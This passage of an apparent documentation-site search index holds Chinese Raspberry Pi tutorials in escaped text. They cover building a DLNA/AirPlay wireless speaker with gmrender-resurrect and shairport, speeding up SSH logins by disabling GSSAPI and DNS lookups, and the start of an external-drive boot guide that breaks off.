\u8ba9\u6811\u8393\u6d3e\u6709\u7ebf/\u65e0\u7ebf\u8fde\u63a5\u4f60\u5230\u5bb6WIFI \u51c6\u5907\u4e00\u4e2a10\u901f\u5185\u5b58\u5361\uff0c\u5e76\u70e7\u5f55\u5b98\u65b9\u7cfb\u7edf DLNA \u534f\u8bae\u9879\u76ee\uff1a gmrender-resurrect AirPlay \u534f\u8bae\u9879\u76ee\uff1a shairport \u5fc5\u8981\u73af\u5883 $ sudo apt-get install git DLNA \u534f\u8bae \u53c2\u8003\u6587\u6863\uff1a https://github.com/hzeller/gmrender-resurrect/blob/master/INSTALL.md \u5b89\u88c5\u4f9d\u8d56 gstreamer1.0-alsa \u53ef\u9009\u4e3a gstreamer1.0-pulseaudio \u8fd9\u4e2a\u8981\u6839\u636e\u81ea\u5df1\u7684\u73af\u5883\u800c\u5b9a\uff0c\u53c2\u8003\u5b98\u65b9\u5e2e\u52a9\u6587\u6863 gmrender-resurrect \u5982\u679c\u4f60\u4e0d\u77e5\u9053\u8fd9\u662f\u4ec0\u4e48\u5c31\u65e0\u89c6\u8fd9\u4e00\u6bb5\u8bdd\u3002 $ sudo apt-get install libupnp-dev libgstreamer1.0-dev gstreamer1.0-plugins-base gstreamer1.0-plugins-good gstreamer1.0-plugins-bad gstreamer1.0-plugins-ugly gstreamer1.0-alsa autoconf \u5b89\u88c5 Gmrender 1\u3001\u5b9a\u4f4d\u5230home\u6587\u4ef6\u5939\u5e76\u514b\u9686\u7a0b\u5e8f\u6e90\u7801 $ cd ../home/$ git clone https://github.com/hzeller/gmrender-resurrect.git 2\u3001\u8f6c\u5230\u521a\u521a\u514b\u9686\u7684gmrender-resurrect\u6587\u4ef6\u5939\u5e76\u5b89\u88c5 $ cd gmrender-resurrect$ ./autogen.sh$ ./configure$ sudo make$ sudo make install 3\u3001\u8f93\u5165\u4e0b\u9762\u7684\u547d\u4ee4\u8fd0\u884c\u670d\u52a1\u5e76\u7528\u7535\u8111\u6216\u8005\u5b89\u5353\u4e00\u7c7b\u652f\u6301DLNA\u64ad\u653e\u7684\u8bbe\u5907\u64ad\u653e\u4e00\u9996\u6b4c\u8bd5\u8bd5\u5427 $ gmediarender -f \"Raspberry-DLNA\" 2 \u8bbe\u7f6e\u5f00\u673a\u81ea\u542f 1\u3001\u62f7\u8d1d\u76f8\u5173\u914d\u7f6e\u6587\u4ef6 $ cp scripts/init.d/gmediarenderer /etc/init.d/ 2\u3001\u5efa\u7acb\u7528\u6237\u7ec4 useradd -g audio gmediarender 3\u3001\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 /etc/init.d/gmediarenderer DAEMON_USER=\"gmediarender:audio\" #\u7528\u6237\u7ec4UPNP_DEVICE_NAME=\"Raspberry-DLNA\" #\u670d\u52a1\u540d\u79f0 4\u3001\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f update-rc.d gmediarenderer defaults AirPlay \u534f\u8bae \u53c2\u8003\u6587\u6863\uff1a https://github.com/abrasive/shairport/wiki \u5b89\u88c5\u4f9d\u8d56 $ apt-get install libssl-dev libavahi-client-dev libasound2-dev libao-dev libpulse-dev \u5b89\u88c5 AirPlay 1\u3001\u5b9a\u4f4d\u5230 home \u6587\u4ef6\u5939\u514b\u9686\u7a0b\u5e8f\u6e90\u7801\u5e76\u5b89\u88c5 $ cd ../home/$ git clone https://github.com/abrasive/shairport.git$ cd shairport$ sudo make$ sudo make install 2\u3001\u542f\u52a8\u670d\u52a1\u7528\u82f9\u679c\u5bb6\u65cf\u8bbe\u5907\u6d4b\u8bd5\u4e00\u4e0b\u80fd\u5426\u6b63\u5e38\u64ad\u653e $ ./shairport -a Raspberry-AirPlay \u8bbe\u7f6e\u5f00\u673a\u81ea\u542f 1\u3001\u62f7\u8d1d\u76f8\u5173\u914d\u7f6e\u6587\u4ef6 $ cp scripts/debian/default/shairport /etc/default/$ cp scripts/debian/init.d/shairport /etc/init.d/$ cp scripts/debian/logrotate.d/shairport /etc/logrotate.d/ 2\u3001\u5efa\u7acb\u7528\u6237\u7ec4 useradd -g audio shairport 3\u3001\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 /etc/init.d/shairport USER=shairport #\u7528\u6237GROUP=audio #\u7528\u6237\u7ec4AP_NAME=Raspberry-AirPlay #\u670d\u52a1\u540d\u79f0 4\u3001\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f update-rc.d shairport defaults \u6700\u7ec8\u6548\u679c \u66f4\u591a\u6559\u7a0b http://raspberrypihq.com/how-to-turn-your-raspberry-pi-into-a-airplay-receiver-to-stream-music-from-your-iphone/ https://blog.wanghw.cn/archives/raspberry-wifisoundtrack.html https://github.com/hzeller/gmrender-resurrect/blob/master/INSTALL.md https://github.com/abrasive/shairport/wiki \u539f\u6587\u94fe\u63a5\uff1a https://www.hscbook.com/article/raspberrypi-audio/","title":"\u6811\u8393\u6d3e\u9999\u6a59\u6d3e\u65e0\u7ebf\u64ad\u653e\uff0c\u5b9e\u73b0DLNA\u4e0eAirPlay\u534f\u8bae\u65e0\u7ebf\u97f3\u7bb1"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#dlnaairplay","text":"\u6539\u9020\u6811\u8393\u6d3e\u3001\u9999\u6a59\u6d3e\u6447\u8eab\u4e00\u53d8\u65e0\u7ebfWIFI\u97f3\u54cd\u5728\u7ebf\u64ad\u653e\uff0c\u65e0\u9700\u5b89\u88c5XBMC\u8fd9\u4e2a\u5e9e\u7136\u5927\u7269\u4e5f\u80fd\u5b9e\u73b0DLNA\u548cAirPlay\u53cc\u534f\u8bae\u7684WIFI\u97f3\u54cd\uff0cDLNA \u5b9e\u73b0\u4e8eGmrender-resurrect\u9879\u76ee\u3001AirPlay\u5b9e\u73b0\u4e8eShairport\u9879\u76ee","title":"\u6811\u8393\u6d3e\u9999\u6a59\u6d3e\u65e0\u7ebf\u64ad\u653e\uff0c\u5b9e\u73b0DLNA\u4e0eAirPlay\u534f\u8bae\u65e0\u7ebf\u97f3\u7bb1"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_1","text":"\u62ff\u51fa\u4f60\u653e\u5728\u89d2\u843d\u91cc\u79ef\u7070\u7684\u6811\u8393\u6d3e\uff0c\u626b\u626b\u7070\u5c18\uff0c\u5fc5\u8981\u7684\u65f6\u5019\u518d\u629a\u6478\u5b89\u6170\u4e00\u4e0b\uff1f\uff01\u54c8\u54c8\u54c8 \u9009\u8d2d\u4e00\u4e2a\u964d\u566a\u7684USB\u58f0\u5361\uff0c\u6811\u8393\u6d3e\u7684\u58f0\u566a\u6709\u70b9\u60e8\u4e0d\u5fcd\u7779 \u9009\u8d2d\u4e00\u4e2a\u5e72\u6270\u4f4e\u7684\u7535\u6e90\u7ed9\u6811\u8393\u6d3e\u4f9b\u7535 \u9009\u8d2d\u4e00\u4e2a\u597d\u70b9\u7684\u97f3\u54cd\u5e76\u8fde\u63a5\u5230\u6811\u8393\u6d3e \u8ba9\u6811\u8393\u6d3e\u6709\u7ebf/\u65e0\u7ebf\u8fde\u63a5\u4f60\u5230\u5bb6WIFI \u51c6\u5907\u4e00\u4e2a10\u901f\u5185\u5b58\u5361\uff0c\u5e76\u70e7\u5f55\u5b98\u65b9\u7cfb\u7edf DLNA \u534f\u8bae\u9879\u76ee\uff1a gmrender-resurrect AirPlay \u534f\u8bae\u9879\u76ee\uff1a shairport","title":"\u51c6\u5907\u5de5\u4f5c"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_2","text":"$ sudo apt-get install git","title":"\u5fc5\u8981\u73af\u5883"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#dlna","text":"\u53c2\u8003\u6587\u6863\uff1a https://github.com/hzeller/gmrender-resurrect/blob/master/INSTALL.md","title":"DLNA \u534f\u8bae"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_3","text":"gstreamer1.0-alsa \u53ef\u9009\u4e3a gstreamer1.0-pulseaudio \u8fd9\u4e2a\u8981\u6839\u636e\u81ea\u5df1\u7684\u73af\u5883\u800c\u5b9a\uff0c\u53c2\u8003\u5b98\u65b9\u5e2e\u52a9\u6587\u6863 gmrender-resurrect \u5982\u679c\u4f60\u4e0d\u77e5\u9053\u8fd9\u662f\u4ec0\u4e48\u5c31\u65e0\u89c6\u8fd9\u4e00\u6bb5\u8bdd\u3002 $ sudo apt-get install libupnp-dev libgstreamer1.0-dev gstreamer1.0-plugins-base gstreamer1.0-plugins-good gstreamer1.0-plugins-bad gstreamer1.0-plugins-ugly gstreamer1.0-alsa autoconf","title":"\u5b89\u88c5\u4f9d\u8d56"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#gmrender","text":"1\u3001\u5b9a\u4f4d\u5230home\u6587\u4ef6\u5939\u5e76\u514b\u9686\u7a0b\u5e8f\u6e90\u7801 $ cd ../home/$ git clone https://github.com/hzeller/gmrender-resurrect.git 2\u3001\u8f6c\u5230\u521a\u521a\u514b\u9686\u7684gmrender-resurrect\u6587\u4ef6\u5939\u5e76\u5b89\u88c5 $ cd gmrender-resurrect$ ./autogen.sh$ ./configure$ sudo make$ sudo make install 3\u3001\u8f93\u5165\u4e0b\u9762\u7684\u547d\u4ee4\u8fd0\u884c\u670d\u52a1\u5e76\u7528\u7535\u8111\u6216\u8005\u5b89\u5353\u4e00\u7c7b\u652f\u6301DLNA\u64ad\u653e\u7684\u8bbe\u5907\u64ad\u653e\u4e00\u9996\u6b4c\u8bd5\u8bd5\u5427 $ gmediarender -f \"Raspberry-DLNA\" 2","title":"\u5b89\u88c5 Gmrender"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_4","text":"1\u3001\u62f7\u8d1d\u76f8\u5173\u914d\u7f6e\u6587\u4ef6 $ cp scripts/init.d/gmediarenderer /etc/init.d/ 2\u3001\u5efa\u7acb\u7528\u6237\u7ec4 useradd -g audio gmediarender 3\u3001\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 /etc/init.d/gmediarenderer DAEMON_USER=\"gmediarender:audio\" #\u7528\u6237\u7ec4UPNP_DEVICE_NAME=\"Raspberry-DLNA\" #\u670d\u52a1\u540d\u79f0 4\u3001\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f update-rc.d gmediarenderer defaults","title":"\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#airplay","text":"\u53c2\u8003\u6587\u6863\uff1a https://github.com/abrasive/shairport/wiki","title":"AirPlay \u534f\u8bae"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_5","text":"$ apt-get install libssl-dev libavahi-client-dev libasound2-dev libao-dev libpulse-dev","title":"\u5b89\u88c5\u4f9d\u8d56"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#airplay_1","text":"1\u3001\u5b9a\u4f4d\u5230 home \u6587\u4ef6\u5939\u514b\u9686\u7a0b\u5e8f\u6e90\u7801\u5e76\u5b89\u88c5 $ cd ../home/$ git clone https://github.com/abrasive/shairport.git$ cd shairport$ sudo make$ sudo make install 2\u3001\u542f\u52a8\u670d\u52a1\u7528\u82f9\u679c\u5bb6\u65cf\u8bbe\u5907\u6d4b\u8bd5\u4e00\u4e0b\u80fd\u5426\u6b63\u5e38\u64ad\u653e $ ./shairport -a Raspberry-AirPlay","title":"\u5b89\u88c5 AirPlay"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_6","text":"1\u3001\u62f7\u8d1d\u76f8\u5173\u914d\u7f6e\u6587\u4ef6 $ cp scripts/debian/default/shairport /etc/default/$ cp scripts/debian/init.d/shairport /etc/init.d/$ cp scripts/debian/logrotate.d/shairport /etc/logrotate.d/ 2\u3001\u5efa\u7acb\u7528\u6237\u7ec4 useradd -g audio shairport 3\u3001\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 /etc/init.d/shairport USER=shairport #\u7528\u6237GROUP=audio #\u7528\u6237\u7ec4AP_NAME=Raspberry-AirPlay #\u670d\u52a1\u540d\u79f0 4\u3001\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f update-rc.d shairport defaults","title":"\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_7","text":"","title":"\u6700\u7ec8\u6548\u679c"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_8","text":"http://raspberrypihq.com/how-to-turn-your-raspberry-pi-into-a-airplay-receiver-to-stream-music-from-your-iphone/ https://blog.wanghw.cn/archives/raspberry-wifisoundtrack.html https://github.com/hzeller/gmrender-resurrect/blob/master/INSTALL.md https://github.com/abrasive/shairport/wiki \u539f\u6587\u94fe\u63a5\uff1a https://www.hscbook.com/article/raspberrypi-audio/","title":"\u66f4\u591a\u6559\u7a0b"},{"location":"RPI/%E8%A7%A3%E5%86%B3%E6%A0%91%E8%8E%93%E6%B4%BESSH%E7%99%BB%E5%BD%95%E7%BC%93%E6%85%A2%E7%9A%84%E9%97%AE%E9%A2%98_Maoning%20Guan%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2/","text":"\u89e3\u51b3\u6811\u8393\u6d3eSSH\u767b\u5f55\u7f13\u6162\u7684\u95ee\u9898_Maoning Guan\u7684\u535a\u5ba2-CSDN\u535a\u5ba2 \u7cfb\u7edf\uff1a \u6811\u8393\u6d3e\uff1a\u6811\u8393\u6d3e3\u4ee3B \u7cfb\u7edf\uff1araspbian \u95ee\u9898\uff1a \u6211\u4eec\u5728\u7528SSH\u767b\u5f55\u6811\u8393\u6d3e\u7684\u65f6\u5019\uff0c\u8f93\u5165\u7528\u6237\u540d\u4e4b\u540e\uff0c\u5f80\u5f80\u9700\u8981\u7b49\u5f8510\u591a\u79d2\u751a\u81f320\u591a\u79d230\u79d2\u624d\u80fd\u5f39\u51fa\u8f93\u5165\u5bc6\u7801\u7684\u9009\u9879\uff0c\u8fd9\u4e2a\u662f\u56e0\u4e3a\u6811\u8393\u6d3e\u5f00\u542f\u4e86gssapi\u8ba4\u8bc1\uff0cgsspi\u662f\u4e00\u79cd\u5de5\u4e1a\u6807\u51c6\u534f\u8bae\uff0c\u53ef\u7528\u4e8eSSH\u8fde\u63a5\u8ba4\u8bc1\u3002 \u89e3\u51b3\u65b9\u6cd5\uff1a \u6240\u4ee5\u4e3a\u4e86\u51cf\u5c11\u7b49\u5f85\u7684\u65f6\u95f4\uff0c\u6211\u4eec\u53ea\u9700\u8981\u628a\u6811\u8393\u6d3e\u7684gssapi\u8ba4\u8bc1\u5173\u95ed\u5373\u53ef\u3002 1\u3001\u5173\u95edssh\u7684gssapi\u8ba4\u8bc1 sudo nano /etc/ssh/ssh_config \u8fdb\u5165ssh_config\u6587\u4ef6\u8fdb\u884c\u7f16\u8f91\uff0c\u5728\u8be5\u6587\u4ef6\u7684\u672b\u5c3e\u627e\u5230\u8fd9\u4e24\u884c\u8bbe\u7f6e\u5e76\u6ce8\u91ca\u6389\uff0c\u7ed3\u679c\u5982\u4e0b\uff1a # GSSAPIAuthentication yes # GSSAPIDelegateCredentials no \u7136\u540eCtrl+x\u9000\u51fa\u7f16\u8f91\uff0c\u8f93\u5165y\u9009\u62e9\u4fdd\u5b58\u6587\u4ef6\uff0c\u6700\u540e\u56de\u8f66\u5373\u53ef\u3002 2\u3001 \u5173\u95edssh\u7684UseDNS sudo nano /etc/ssh/sshd_config \u8fdb\u5165sshd_config\u6587\u4ef6\u8fdb\u884c\u7f16\u8f91\uff0c\u5728\u8be5\u6587\u4ef6\u7684\u672b\u5c3e\u52a0\u5165\u4ee5\u4e0b\u4ee3\u7801\uff1a UseDNS no \u7136\u540eCtrl+x\u9000\u51fa\u7f16\u8f91\uff0c\u8f93\u5165y\u9009\u62e9\u4fdd\u5b58\u6587\u4ef6\uff0c\u6700\u540e\u56de\u8f66\u5373\u53ef\u3002 3\u3001\u6700\u540e\u91cd\u542f\u6811\u8393\u6d3e\u5373\u53ef\uff1a sudo reboot 4\u3001\u6d4b\u8bd5 \u91cd\u65b0\u7528SSH\u8fde\u63a5\u6811\u8393\u6d3e\u7684\u65f6\u5019\uff0c\u5f53\u8f93\u5165\u7528\u6237\u540d\u4e4b\u540e\uff0c\u77ac\u95f4\u5c31\u4f1a\u5f39\u51fa\u8981\u6c42\u8f93\u5165\u5bc6\u7801\u7684\u9009\u9879\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/guanmaoning/article/details/80283012","title":"\u89e3\u51b3\u6811\u8393\u6d3eSSH\u767b\u5f55\u7f13\u6162\u7684\u95ee\u9898 Maoning Guan\u7684\u535a\u5ba2 CSDN\u535a\u5ba2"},{"location":"RPI/%E8%A7%A3%E5%86%B3%E6%A0%91%E8%8E%93%E6%B4%BESSH%E7%99%BB%E5%BD%95%E7%BC%93%E6%85%A2%E7%9A%84%E9%97%AE%E9%A2%98_Maoning%20Guan%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2/#ssh_maoning-guan-csdn","text":"\u7cfb\u7edf\uff1a \u6811\u8393\u6d3e\uff1a\u6811\u8393\u6d3e3\u4ee3B \u7cfb\u7edf\uff1araspbian \u95ee\u9898\uff1a \u6211\u4eec\u5728\u7528SSH\u767b\u5f55\u6811\u8393\u6d3e\u7684\u65f6\u5019\uff0c\u8f93\u5165\u7528\u6237\u540d\u4e4b\u540e\uff0c\u5f80\u5f80\u9700\u8981\u7b49\u5f8510\u591a\u79d2\u751a\u81f320\u591a\u79d230\u79d2\u624d\u80fd\u5f39\u51fa\u8f93\u5165\u5bc6\u7801\u7684\u9009\u9879\uff0c\u8fd9\u4e2a\u662f\u56e0\u4e3a\u6811\u8393\u6d3e\u5f00\u542f\u4e86gssapi\u8ba4\u8bc1\uff0cgsspi\u662f\u4e00\u79cd\u5de5\u4e1a\u6807\u51c6\u534f\u8bae\uff0c\u53ef\u7528\u4e8eSSH\u8fde\u63a5\u8ba4\u8bc1\u3002 \u89e3\u51b3\u65b9\u6cd5\uff1a \u6240\u4ee5\u4e3a\u4e86\u51cf\u5c11\u7b49\u5f85\u7684\u65f6\u95f4\uff0c\u6211\u4eec\u53ea\u9700\u8981\u628a\u6811\u8393\u6d3e\u7684gssapi\u8ba4\u8bc1\u5173\u95ed\u5373\u53ef\u3002 1\u3001\u5173\u95edssh\u7684gssapi\u8ba4\u8bc1 sudo nano /etc/ssh/ssh_config \u8fdb\u5165ssh_config\u6587\u4ef6\u8fdb\u884c\u7f16\u8f91\uff0c\u5728\u8be5\u6587\u4ef6\u7684\u672b\u5c3e\u627e\u5230\u8fd9\u4e24\u884c\u8bbe\u7f6e\u5e76\u6ce8\u91ca\u6389\uff0c\u7ed3\u679c\u5982\u4e0b\uff1a # GSSAPIAuthentication yes # GSSAPIDelegateCredentials no \u7136\u540eCtrl+x\u9000\u51fa\u7f16\u8f91\uff0c\u8f93\u5165y\u9009\u62e9\u4fdd\u5b58\u6587\u4ef6\uff0c\u6700\u540e\u56de\u8f66\u5373\u53ef\u3002 2\u3001 \u5173\u95edssh\u7684UseDNS sudo nano /etc/ssh/sshd_config \u8fdb\u5165sshd_config\u6587\u4ef6\u8fdb\u884c\u7f16\u8f91\uff0c\u5728\u8be5\u6587\u4ef6\u7684\u672b\u5c3e\u52a0\u5165\u4ee5\u4e0b\u4ee3\u7801\uff1a UseDNS no \u7136\u540eCtrl+x\u9000\u51fa\u7f16\u8f91\uff0c\u8f93\u5165y\u9009\u62e9\u4fdd\u5b58\u6587\u4ef6\uff0c\u6700\u540e\u56de\u8f66\u5373\u53ef\u3002 3\u3001\u6700\u540e\u91cd\u542f\u6811\u8393\u6d3e\u5373\u53ef\uff1a sudo reboot 4\u3001\u6d4b\u8bd5 \u91cd\u65b0\u7528SSH\u8fde\u63a5\u6811\u8393\u6d3e\u7684\u65f6\u5019\uff0c\u5f53\u8f93\u5165\u7528\u6237\u540d\u4e4b\u540e\uff0c\u77ac\u95f4\u5c31\u4f1a\u5f39\u51fa\u8981\u6c42\u8f93\u5165\u5bc6\u7801\u7684\u9009\u9879\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/guanmaoning/article/details/80283012","title":"\u89e3\u51b3\u6811\u8393\u6d3eSSH\u767b\u5f55\u7f13\u6162\u7684\u95ee\u9898_Maoning Guan\u7684\u535a\u5ba2-CSDN\u535a\u5ba2"},{"location":"RPI/%E8%AE%BE%E7%BD%AE%E6%A0%91%E8%8E%93%E6%B4%BE%E4%BD%BF%E7%94%A8%E5%A4%96%E7%BD%AE%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8/","text":"\u8bbe\u7f6e\u6811\u8393\u6d3e\u4f7f\u7528\u5916\u7f6e\u786c\u76d8\u542f\u52a8 \u6574\u4ef6\u4e8b\u60c5\u662f\u8fd9\u6837\u7684\uff1a\u67d0\u4e00\u5929\u6211\u5c1d\u8bd5\u5728\u6811\u8393\u6d3e\u4e0a\u5b89\u88c5\u4e00\u4e2a vim \u7684\u7f16\u8f91\u5668\u63d2\u4ef6 YouCompleteMe \uff0c\u9700\u8981\u4ece\u6e90\u7801\u7f16\u8bd1\u3002\u7f16\u8bd1\u8fd9\u4e2a\u6bd4\u8f83\u8017\u8d39\u5185\u5b58\uff0c\u53ef\u80fd\u6211\u5206\u914d\u7684 SWAP \u4e0d\u591f\u5927\uff081024MB\uff09\uff0c\u5bfc\u81f4\u5185\u5b58\u4e0d\u8db3\uff0c\u7136\u540e sshd \u5c31\u6302\u4e86\u3002\u55ef\uff0c\u5e76\u4e14\u5df2\u7ecf\u8fc7\u53bb\u4e86\u4e00\u4e2a\u5c0f\u65f6\u6211\u4e5f\u6ca1\u6cd5\u8fde\u63a5\u4e0a\u53bb\u3002\u4e8e\u662f\u6211\u5c31\u62d4\u7535\u6e90\u91cd\u542f\u4e86\uff0c\u8fd9\u4e0b\u53ef\u597d\uff0cSD \u5361\u5f7b\u5e95\u542f\u52a8\u4e0d\u4e86\u4e86\uff0c\u4f30\u8ba1\u662f\u6587\u4ef6\u7cfb\u7edf\u635f\u574f\u4e4b\u7c7b\u7684\u3002\u4e0a\u7f51\u641c\u4e86\u4e00\u4e0b\u8fd9\u79cd\u73b0\u8c61\u4f3c\u4e4e\u975e\u5e38\u5e38\u89c1\uff0c\u53ea\u8981\u5728\u65ad\u7535\u65f6 SD \u5361\u8fd8\u5728\u5199\u5165\u5c31\u53ef\u80fd\u51fa\u73b0\u3002\u4e8e\u662f\u6211\u5c31\u60f3\u5230\u8981\u628a\u7cfb\u7edf\u88c5\u5728\u5916\u7f6e\u786c\u76d8\u4e0a\u3002 \u9996\u5148\u786c\u4ef6\u914d\u7f6e\u662f\u8fd9\u6837\u7684\uff1a\u6211\u624b\u4e0a\u6709 8GB \u548c 16GB \u7684 C10 SD \u5361\u5404\u4e00\u5f20\uff0c500GB \u7684\u79fb\u52a8\u786c\u76d8\u4e00\u4e2a\uff08\u4e4b\u524d\u7b14\u8bb0\u672c\u7684\u673a\u68b0\u786c\u76d8\uff0c\u6362 SSD \u7684\u65f6\u5019\u62c6\u4e0b\u6765\u88c5\u5728\u79fb\u52a8\u786c\u76d8\u76d2\u91cc\uff09\uff0c\u6709\u6e90 USB Hub \u4e00\u4e2a\uff0c\u6811\u8393\u6d3e\u4e00\u4e2a\u3002\u5176\u4e2d\u79fb\u52a8\u786c\u76d8\u4e0a\u6709\u4e24\u4e2a NTFS \u5206\u533a\uff08Windows \u7684 C\u76d8\u548c D\u76d8\uff09\u548c\u4e00\u4e2a ext4 \u5206\u533a\uff08\u5f88\u4e45\u4ee5\u524d\u7684 Ubuntu \u7cfb\u7edf\uff0c\u6240\u6709\u6570\u636e\u90fd\u5728\u91cc\u9762\uff09\u3002 \u6211\u60f3\u5b9e\u73b0\u7684\u6548\u679c\u662f\u8fd9\u6837\u7684\uff1a\u6e05\u7a7a\u65e7\u7684 Windows C\u76d8\uff0890GB\uff09\uff0c\u5206\u51fa 30GB \u7ed9 Raspbian\uff0c\u7136\u540e\u6811\u8393\u6d3e\u8981\u4ece\u786c\u76d8\u542f\u52a8\u3002 \u7b80\u5355\u641c\u7d22\u4e86\u4e00\u4e0b\u53d1\u73b0\u76f4\u63a5\u4ece\u786c\u76d8\u542f\u52a8\u662f\u4e0d\u884c\u7684\uff0c\u56e0\u4e3a\u6811\u8393\u6d3e\u542f\u52a8\u7684\u65f6\u5019\u56fa\u5b9a\u662f\u4ece SD \u5361\u7684\u7b2c\u4e00\u4e2a\u5206\u533a\uff08/boot\uff09\u8bfb\u53d6 config.txt \u3001 cmdline.txt \u548c kernel.img \u8fd9\u4e09\u4e2a\u6587\u4ef6\u3002\u4f46\u662f\u9664\u6b64\u4e4b\u5916\uff0c\u5404\u4e2a\u5916\u63a5\u8bbe\u5907\u7684\u6302\u8f7d\u70b9\u5219\u662f\u6ca1\u6709\u9650\u5236\u7684\u3002\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u5c06 /boot \u5206\u533a\u653e\u5728 SD \u5361\u4e0a\uff0c\u5e76\u8bbe\u7f6e\u4e3a\u53ea\u8bfb\u7684\uff0c\u907f\u514d\u610f\u5916\u5173\u673a\u65f6\u635f\u574f\u4e0a\u9762\u7684\u6587\u4ef6\u7cfb\u7edf\uff1b\u540c\u65f6\u6211\u4eec\u628a\u7cfb\u7edf\u7684\u5176\u4ed6\u90e8\u5206\u90fd\u653e\u5728\u5916\u7f6e\u786c\u76d8\u4e0a\uff0c\u901a\u8fc7 USB 